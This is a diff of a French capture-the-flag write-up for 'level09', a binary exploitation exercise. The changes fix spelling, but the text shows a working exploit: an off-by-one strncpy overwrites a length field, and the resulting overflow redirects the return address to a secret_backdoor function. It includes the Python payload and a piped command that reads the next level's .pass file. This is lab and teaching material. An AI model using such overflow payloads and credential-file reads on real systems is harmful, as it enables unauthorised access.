@@ -13,7 +13,7 @@ $ ./level09
 >: Msg sent!
 ```
 
-On voir qu'il y a une fonction `secret_backdoor` non appele, qui serai tres utile. Notre objectif est de modifier l'`rip` pour mettre l'adresse de cette fonction
+On peut voir qu'il y a une fonction `secret_backdoor` non appellée, qui serai très utile. Notre objectif est de modifier le `rip` pour mettre l'adresse de cette fonction
 
 ```shell
 $ gdb level09 -q
@@ -31,13 +31,13 @@ Breakpoint 1, 0x0000555555554aa8 in main ()
 0x55555555488c <secret_backdoor>: 0xe5894855
 ```
 
-On peut observer qu'il y a un `strncpy(s->username, username, 41)` dans la fonction `set_username` alors que `s->username[40]`. Il va alors reecrire sur `s->i` qui est utiliser dans `strncpy(s->msg, message, s->i)`.
+On peut observer qu'il y a un `strncpy(s->username, username, 41)` dans la fonction `set_username` alors que `s->username[40]` fait donc 40 octets. Il va alors réécrire sur `s->i` qui est utilisé dans `strncpy(s->msg, message, s->i)`.
 
 - `LEN_STRUCT + RBP + 4(DEMI_RIP) = 204 <=> 0xcc`
 
 on aura alors une chaine `python -c 'print("A"*40 + "\xcc\n" + "B"*200 + "\x55\x55\x48\x8c"[::-1])'`
 
-On a plus qu'a essayer
+On a plus qu'à essayer
 
 ```shell
 $ (python -c 'print("A"*40 + "\xcc\n" + "B"*200 + "\x55\x55\x48\x8c"[::-1]) + "\ncat /home/users/end/.pass"') | ./level09
